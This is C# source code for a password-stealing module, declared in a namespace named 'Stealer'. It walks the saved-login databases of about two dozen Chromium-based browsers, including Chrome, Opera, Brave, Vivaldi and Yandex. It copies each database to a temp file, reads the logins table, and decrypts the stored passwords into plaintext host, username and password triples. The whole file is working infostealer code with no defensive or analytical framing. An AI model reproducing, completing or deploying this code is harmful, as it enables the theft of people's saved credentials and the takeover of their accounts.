using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer
{
    internal class Passwords
    {

        // Return list with arrays (hostname, usesrname, password)
        public static List<string[]> get()
        {
            // Path info
            string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string u_s = "\\User Data\\Default\\Login Data";
            // Browsers list
            string[] chromiumBasedBrowsers = new string[]
            {
                l_a + "Google\\Chrome" + u_s,
                l_a + "Google(x86)\\Chrome" + u_s,
                l_a + "Chromium" + u_s,
                a_a + "Opera Software\\Opera Stable\\Login Data",
                l_a + "BraveSoftware\\Brave-Browser" + u_s,
                l_a + "Epic Privacy Browser" + u_s,
                l_a + "Amigo" + u_s,
                l_a + "Vivaldi" + u_s,
                l_a + "Orbitum" + u_s,
                l_a + "Mail.Ru\\Atom" + u_s,
                l_a + "Kometa" + u_s,
                l_a + "Comodo\\Dragon" + u_s,
                l_a + "Torch" + u_s,
                l_a + "Comodo" + u_s,
                l_a + "Slimjet" + u_s,
                l_a + "360Browser\\Browser" + u_s,
                l_a + "Maxthon3" + u_s,
                l_a + "K-Melon" + u_s,
                l_a + "Sputnik\\Sputnik" + u_s,
                l_a + "Nichrome" + u_s,
                l_a + "CocCoc\\Browser" + u_s,
                l_a + "uCozMedia\\Uran" + u_s,
                l_a + "Chromodo" + u_s,
                l_a + "Yandex\\YandexBrowser" + u_s
            };

            List<string[]> passwords = new List<string[]>();
            // Database
            string tempDatabaseLocation = "";


            // Search all browsers
            foreach (string browser in chromiumBasedBrowsers)
            {
                if (File.Exists(browser))
                {
                    tempDatabaseLocation = Environment.GetEnvironmentVariable("temp") + "\\browserPasswords";
                    if (File.Exists(tempDatabaseLocation))
                    {
                        File.Delete(tempDatabaseLocation);
                    }
                    File.Copy(browser, tempDatabaseLocation);
                } else {
                    continue;
                }

                // Read chrome database
                cSQLite sSQLite = new cSQLite(tempDatabaseLocation);
                sSQLite.ReadTable("logins");

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    // Get data from database
                    string hostname = sSQLite.GetValue(i, 0);
                    string username = sSQLite.GetValue(i, 3);
                    string password = sSQLite.GetValue(i, 5);

                    // If no data => break
                    if (string.IsNullOrEmpty(password))
                    {
                        break;
                    }

                    // Show credentials
                    string[] credentials = new string[3]
                    {
                        hostname,
                        Crypt.toUTF8(username),
                        Crypt.toUTF8(Crypt.decryptChrome(password, browser))
                    };
                    passwords.Add(credentials);
                    continue;
                }
                continue;
            }
            return passwords;
        }
    }
}
